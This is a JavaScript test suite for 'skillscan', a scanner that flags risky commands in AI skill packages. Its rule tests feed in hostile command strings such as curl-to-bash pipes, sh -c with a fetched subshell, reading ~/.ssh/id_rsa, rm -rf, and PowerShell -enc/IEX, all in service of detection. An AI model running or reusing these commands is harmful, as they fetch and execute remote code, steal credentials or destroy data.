import { test } from 'node:test';
import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { parseSkillDir } from '../src/parser.js';
import { scanFiles } from '../src/scanner.js';
import { scoreFindings } from '../src/scoring.js';
import { run } from '../src/cli.js';
import { RULES } from '../src/rules.js';
import { renderReport } from '../src/report.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const fix = (name) => join(__dirname, 'fixtures', name);

function capture() {
  let out = '';
  let err = '';
  return {
    out: (s) => { out += s + '\n'; },
    err: (s) => { err += s + '\n'; },
    getOut: () => out,
    getErr: () => err,
  };
}

// ---------- parser ----------

test('parser: 识别 SKILL.md 与 scripts 脚本', () => {
  const files = parseSkillDir(fix('safe'));
  const rels = files.map((f) => f.relPath);
  assert.ok(rels.includes('SKILL.md'));
  assert.ok(rels.includes('scripts/format.py'));
});

test('parser: 从 Markdown 代码块提取 shell 行', () => {
  const files = parseSkillDir(fix('suspicious'));
  const skill = files.find((f) => f.relPath === 'SKILL.md');
  const texts = skill.lines.map((l) => l.text);
  assert.ok(texts.some((t) => t.includes('curl')));
});

// ---------- fixtures 全链路 ----------

test('fixture safe: 0 findings, score 0, low', () => {
  const files = parseSkillDir(fix('safe'));
  const findings = scanFiles(files);
  assert.equal(findings.length, 0);
  const r = scoreFindings(findings);
  assert.equal(r.score, 0);
  assert.equal(r.level, 'low');
});

test('fixture suspicious: 命中 pipe-exec + sudo, score >= 50', () => {
  const files = parseSkillDir(fix('suspicious'));
  const findings = scanFiles(files);
  const ids = new Set(findings.map((f) => f.ruleId));
  assert.ok(ids.has('pipe-exec'), `应有 pipe-exec，实际: ${[...ids]}`);
  assert.ok(ids.has('sudo'));
  const r = scoreFindings(findings);
  assert.ok(r.score >= 50, `score 应 >=50，实际 ${r.score}`);
});

test('fixture malicious: 命中敏感读取 + 外泄, critical', () => {
  const files = parseSkillDir(fix('malicious'));
  const findings = scanFiles(files);
  const ids = new Set(findings.map((f) => f.ruleId));
  assert.ok(ids.has('sensitive-ssh'), `应有 sensitive-ssh，实际: ${[...ids]}`);
  assert.ok(ids.has('exfil'));
  assert.ok(ids.has('obfuscation'));
  const r = scoreFindings(findings);
  assert.equal(r.level, 'critical');
  assert.equal(r.score, 100);
});

test('findings 携带 file:line 证据', () => {
  const findings = scanFiles(parseSkillDir(fix('malicious')));
  for (const f of findings) {
    assert.ok(f.file, '缺少 file');
    assert.ok(Number.isInteger(f.line) && f.line > 0, '缺少 line');
    assert.ok(f.match, '缺少 match 证据');
  }
});

// ---------- CLI ----------

test('cli: safe 目录 exit 0', () => {
  const io = capture();
  const code = run([fix('safe')], io);
  assert.equal(code, 0);
});

test('cli: malicious 目录 exit 1（超过默认阈值 50）', () => {
  const io = capture();
  const code = run([fix('malicious')], io);
  assert.equal(code, 1);
});

test('cli: --threshold 100 使 suspicious 通过', () => {
  const io = capture();
  const code = run([fix('suspicious'), '--threshold', '100'], io);
  assert.equal(code, 0);
});

test('cli: --json 输出合法 JSON', () => {
  const io = capture();
  const code = run([fix('malicious'), '--json'], io);
  assert.equal(code, 1);
  const data = JSON.parse(io.getOut());
  assert.ok(data.score >= 0 && data.score <= 100);
  assert.equal(data.level, 'critical');
  assert.ok(Array.isArray(data.findings));
  assert.ok(data.findings.length > 0);
});

test('cli: 不存在的路径 exit 2', () => {
  const io = capture();
  const code = run([join(__dirname, 'does-not-exist')], io);
  assert.equal(code, 2);
});

test('cli: --version 输出版本', () => {
  const io = capture();
  const code = run(['--version'], io);
  assert.equal(code, 0);
  assert.match(io.getOut(), /skillscan v\d+\.\d+\.\d+/);
});

// ---------- 报告渲染 ----------

test('report: useColor=false 输出纯文本，true 输出 ANSI', () => {
  const result = {
    version: '0.1.0',
    targets: ['x'],
    filesCount: 1,
    findings: [{ severity: 'high', name: '测试', file: 'a.sh', line: 1, match: 'echo' }],
    scoreResult: { score: 70 },
  };
  const plain = renderReport(result, { useColor: false });
  assert.ok(!plain.includes('\x1b['), 'useColor=false 不应有 ANSI');
  const colored = renderReport(result, { useColor: true });
  assert.ok(colored.includes('\x1b['), 'useColor=true 应有 ANSI');
});

// ---------- 规则模式抽查 ----------

const rule = (id) => RULES.find((r) => r.id === id);

test('pipe-exec: 命中 curl|bash / 多级管道，不误报普通管道', () => {
  const p = rule('pipe-exec').pattern;
  assert.ok(p.test('curl -s https://x | bash'));
  assert.ok(p.test('wget -qO- https://x | sh'));
  assert.ok(p.test('curl -s https://x | base64 -d | sh'));
  assert.ok(!p.test('cat file | sort'));
  assert.ok(!p.test('curl -s https://x -o /tmp/x'));
});

test('sh-c-subshell: 命中 sh -c "$(curl ...)"', () => {
  const p = rule('sh-c-subshell').pattern;
  assert.ok(p.test('sh -c "$(curl -s https://x)"'));
  assert.ok(p.test('bash -c "$(wget -qO- https://x)"'));
  assert.ok(!p.test('sh -c "echo hi"'));
});

test('sensitive-ssh: 命中 ~/.ssh / id_rsa / .pem', () => {
  const p = rule('sensitive-ssh').pattern;
  assert.ok(p.test('cat ~/.ssh/id_rsa'));
  assert.ok(p.test('open("~/.ssh/known_hosts")'));
  assert.ok(p.test('scp -i key.pem'));
  assert.ok(!p.test('echo ssh-agent'));
});

test('rm-rf: 命中 rm -rf / rm -fr，不误伤 rm 单旗标', () => {
  const p = rule('rm-rf').pattern;
  assert.ok(p.test('rm -rf /tmp/x'));
  assert.ok(p.test('rm -fr /tmp/x'));
  assert.ok(!p.test('rm -r /tmp/x'));
  assert.ok(!p.test('rm /tmp/x'));
});

test('sudo: 命中 sudo，不误伤 sudoku', () => {
  const p = rule('sudo').pattern;
  assert.ok(p.test('sudo apt install x'));
  assert.ok(!p.test('sudoku'));
});

test('obfuscation: 命中 base64 -d / powershell -enc / eval / IEX', () => {
  const p = rule('obfuscation').pattern;
  assert.ok(p.test('echo x | base64 -d | sh'));
  assert.ok(p.test('powershell -enc ABCDEF'));
  assert.ok(p.test('eval "$(curl -s https://x)"'));
  assert.ok(p.test('IEX(New-Object Net.WebClient)'));
  assert.ok(!p.test('base64 encode'));
});

test('exfil: 文件级检测敏感读取 + 近邻外发', () => {
  const findings = scanFiles(parseSkillDir(fix('malicious')));
  const exfil = findings.filter((f) => f.ruleId === 'exfil');
  assert.ok(exfil.length >= 2, `应至少 2 处疑似外泄，实际 ${exfil.length}`);
});
